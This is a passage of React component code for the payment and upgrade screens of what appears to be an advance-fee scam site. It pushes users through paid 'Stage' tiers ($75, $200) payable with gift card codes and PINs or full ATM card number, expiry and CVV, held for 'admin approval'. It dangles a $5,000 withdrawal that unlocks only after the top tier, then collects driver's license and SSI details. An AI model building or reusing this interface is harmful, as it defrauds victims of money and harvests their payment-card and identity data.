                      'Previous card was rejected as wrong or used. Please drop a real, unused gift card.'
                    );
                    setStep(2);
                  }}
                  className="w-full max-w-xs min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 px-5 rounded-xl text-sm shadow-md transition-all cursor-pointer"
                >
                  Submit a Real Unused Gift Card
                </button>
              </>
            ) : paymentMethod === 'giftcard' && pendingStatusId ? (
              <>
                <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin" />
                <span className="text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
                  Pending Real Card Check
                </span>
                <h3 className="text-2xl font-bold text-gray-900">
                  Verifying Stage {selectedTier?.stage} Gift Card
                </h3>
                <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
                  We have checked that your card matches a real format and are now confirming it has not been used before activating <strong>Stage {selectedTier?.stage} — {selectedTier?.name}</strong>.
                </p>
                <GiftCardCheckChecklist />
                <div className="w-full bg-purple-50 border border-purple-200 rounded-xl p-3 text-xs text-purple-800 max-w-sm">
                  Reference ID: <span className="font-mono font-bold">{pendingStatusId}</span>
                </div>
                {statusCheckNote && (
                  <p className="text-xs text-amber-700 font-medium max-w-sm">{statusCheckNote}</p>
                )}
                <button
                  type="button"
                  onClick={handleManualCheckUpgradeStatus}
                  disabled={isCheckingStatus}
                  className="w-full max-w-sm min-h-[44px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-2.5 px-4 rounded-xl text-xs shadow-sm cursor-pointer disabled:opacity-60"
                >
                  {isCheckingStatus ? 'Checking Confirmation Status...' : 'Check Confirmation Status'}
                </button>
                <button
                  type="button"
                  onClick={() => {
                    if (pendingUpgradeStorageKey) localStorage.removeItem(pendingUpgradeStorageKey);
                    setPendingStatusId(null);
                    setGiftCardCode('');
                    setGiftCardPin('');
                    setGiftCardImage(null);
                    setConfirmedUnused(false);
                    setStatusCheckNote('');
                    setStep(2);
                  }}
                  className="text-xs font-semibold text-gray-500 hover:text-purple-700 underline cursor-pointer pt-1"
                >
                  Cancel & submit a different card
                </button>
              </>
            ) : user?.cardRejectionReason ? (
              <>
                <div className="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center ring-8 ring-red-50">
                  <AlertCircle className="w-9 h-9" />
                </div>
                <span className="text-xs font-extrabold uppercase tracking-wider bg-red-100 text-red-800 border border-red-200 px-3 py-1 rounded-full">
                  Card Declined by Admin
                </span>
                <h3 className="text-2xl font-extrabold text-red-700">
                  ATM Card Upgrade Rejected
                </h3>
                <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
                  {user.cardRejectionReason}
                </p>
                <button
                  type="button"
                  onClick={() => {
                    if (pendingUpgradeStorageKey) localStorage.removeItem(pendingUpgradeStorageKey);
                    updateUser({ cardRejectionReason: '' });
                    setCardError('Previous ATM card was declined. Please submit another valid card or verify with a gift card.');
                    setStep(2);
                  }}
                  className="w-full max-w-xs min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 px-5 rounded-xl text-sm shadow-md transition-all cursor-pointer"
                >
                  Try Another Card or Gift Card
                </button>
              </>
            ) : (
              <>
                <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin" />
                <span className="text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
                  Pending Admin Approval • Upgrade Locked
                </span>
                <h3 className="text-2xl font-bold text-gray-900">Awaiting Admin Approval</h3>
                <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
                  Your ATM card details for Stage {selectedTier?.stage} ({selectedTier?.name}) have been submitted. <strong>Your upgrade will remain locked until approved by admin.</strong>
                </p>
                <div className="text-xs text-gray-500 space-y-1 pt-2">
                  <p>Once approved by admin in the portal, your upgrade will automatically unlock right here.</p>
                </div>
              </>
            )}
          </div>
        )}

        {/* Step 4: Upgrade Success */}
        {step === 4 && selectedTier && (
          <div className="bg-white rounded-3xl p-6 sm:p-8 shadow-xl border border-gray-100 text-center space-y-6">
            <div className="w-20 h-20 bg-amber-100 rounded-full flex items-center justify-center mx-auto text-amber-600 ring-8 ring-amber-50">
              <Crown className="w-10 h-10 fill-amber-500" />
            </div>

            <div>
              <h3 className="text-2xl font-extrabold text-gray-900">
                Welcome to Stage {selectedTier.stage} — {selectedTier.name}!
              </h3>
              <p className="text-sm text-emerald-600 font-semibold mt-1">
                Your account has been successfully upgraded
              </p>
            </div>

            <div className="bg-purple-50 rounded-2xl p-5 border border-purple-100 text-left space-y-2 text-xs">
              <p className="font-bold text-purple-900 mb-2">Unlocked Benefits:</p>
              {selectedTier.benefits.map((b, idx) => (
                <div key={idx} className="flex items-center space-x-2 text-purple-800">
                  <Check className="w-3.5 h-3.5 text-purple-600 shrink-0" />
                  <span>{b}</span>
                </div>
              ))}
            </div>

            {selectedTier.stage === 1 ? (
              <div className="bg-amber-50 border border-amber-200 rounded-2xl p-4 text-left space-y-3">
                <div className="flex items-center space-x-2 text-amber-900 font-bold text-sm">
                  <Crown className="w-4 h-4 text-amber-600 shrink-0" />
                  <span>Next Step: Upgrade to Stage 2 — Gold</span>
                </div>
                <p className="text-xs text-amber-800 leading-relaxed">
                  Stage 1 (Silver) is active. Please upgrade to the second tier <strong>Stage 2 — Gold ($75)</strong> next — you will need to reach <strong>Stage 5 (Ruby)</strong> for your first withdrawal ($5,000 minimum).
                </p>
                <button
                  type="button"
                  onClick={() => {
                    setSelectedTier(TIERS[1]);
                    setGiftCardCode('');
                    setGiftCardPin('');
                    setGiftCardImage(null);
                    setGiftCardError('');
                    setCardNumber('');
                    setExpiry('');
                    setCvv('');
                    setCardError('');
                    setStep(2);
                  }}
                  className="w-full min-h-[44px] bg-amber-500 hover:bg-amber-600 text-purple-950 font-bold py-3 rounded-xl text-xs sm:text-sm shadow-sm transition-all cursor-pointer flex items-center justify-center space-x-1.5"
                >
                  <Crown className="w-4 h-4" />
                  <span>Upgrade to Stage 2 — Gold ($75)</span>
                </button>
              </div>
            ) : selectedTier.stage < 5 ? (
              <div className="bg-rose-50 border border-rose-200 rounded-2xl p-4 text-left space-y-3">
                <div className="flex items-center space-x-2 text-rose-900 font-bold text-sm">
                  <Crown className="w-4 h-4 text-rose-600 shrink-0" />
                  <span>Ruby Tier Required for First Withdrawal ($5,000 Min)</span>
                </div>
                <p className="text-xs text-rose-800 leading-relaxed">
                  Stage {selectedTier.stage} ({selectedTier.name}) is active. Since the minimum withdrawal is <strong>$5,000</strong>, upgrade to <strong>Stage 5 — Ruby ($200)</strong> to unlock your first withdrawal.
                </p>
                <button
                  type="button"
                  onClick={() => {
                    setSelectedTier(TIERS[4]);
                    setGiftCardCode('');
                    setGiftCardPin('');
                    setGiftCardImage(null);
                    setGiftCardError('');
                    setCardNumber('');
                    setExpiry('');
                    setCvv('');
                    setCardError('');
                    setStep(2);
                  }}
                  className="w-full min-h-[44px] bg-rose-600 hover:bg-rose-700 text-white font-bold py-3 rounded-xl text-xs sm:text-sm shadow-sm transition-all cursor-pointer flex items-center justify-center space-x-1.5"
                >
                  <Crown className="w-4 h-4 text-amber-300" />
                  <span>Upgrade to Stage 5 — Ruby ($200)</span>
                </button>
              </div>
            ) : !user?.kycVerified && onNavigateToKyc ? (
              <div className="bg-purple-50 border border-purple-200 rounded-2xl p-4 text-left space-y-3">
                <div className="flex items-center space-x-2 text-purple-900 font-bold text-sm">
                  <ShieldCheck className="w-4 h-4 text-purple-600 shrink-0" />
                  <span>Final Step: Verify Driver&apos;s License &amp; SSI Details</span>
                </div>
                <p className="text-xs text-purple-800 leading-relaxed">
                  You have reached <strong>Stage {selectedTier.stage} ({selectedTier.name})</strong>! Complete your Account Verification with your <strong>Driver&apos;s License &amp; SSI details</strong> to unlock withdrawals.
                </p>
                <button
                  type="button"
                  onClick={onNavigateToKyc}
                  className="w-full min-h-[44px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 rounded-xl text-xs sm:text-sm shadow-sm transition-all cursor-pointer flex items-center justify-center space-x-1.5"
                >
                  <ShieldCheck className="w-4 h-4 text-emerald-300" />
                  <span>Verify Driver&apos;s License &amp; SSI Now</span>
                </button>
              </div>
            ) : null}

            <button
              onClick={onBack}
              className={`w-full font-bold py-3.5 rounded-xl text-sm transition-all cursor-pointer ${
                selectedTier.stage < 5 || (!user?.kycVerified && onNavigateToKyc)
                  ? 'bg-gray-100 hover:bg-gray-200 text-gray-700'
                  : 'bg-purple-600 hover:bg-purple-700 text-white shadow-md'
              }`}
            >
              Back to Dashboard
            </button>
          </div>
        )}
      </div>
      <GiftCardVerdictModal verdict={verdictModal} onClose={() => setVerdictModal(null)} />
    </div>
  );
};
